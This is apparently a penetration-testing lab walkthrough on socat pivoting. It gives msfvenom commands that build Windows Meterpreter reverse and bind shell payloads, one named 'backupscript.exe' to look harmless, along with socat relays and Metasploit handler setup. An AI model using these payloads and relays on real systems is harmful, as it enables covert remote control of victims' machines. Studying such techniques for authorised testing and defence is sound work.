### Reverse shell

Socat is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling.

#### Starting Socat Listener

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
Socat will listen on localhost on port `8080` and forward all the traffic to port `80` on our attack host (10.10.14.18).

#### Creating the Windows Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

#### Configuring & Starting the multi/handler

```bash
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set lhost 0.0.0.0
msf6 > set lport 80
msf6 > run
```

Get the payload to the target and execute.

---
### Bind shell

We can create a bind shell using msfvenom with the below command.
#### Creating the Windows Payload

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```

We can start a `socat bind shell` listener, which listens on port `8080` and forwards packets to Windows server `8443`.

#### Starting Socat Bind Shell Listener

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

#### Configuring & Starting the Bind multi/handler

```bash
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/bind_tcp
msf6 > set RHOST 10.129.202.64
msf6 > set RPORT 8080
msf6 > run
```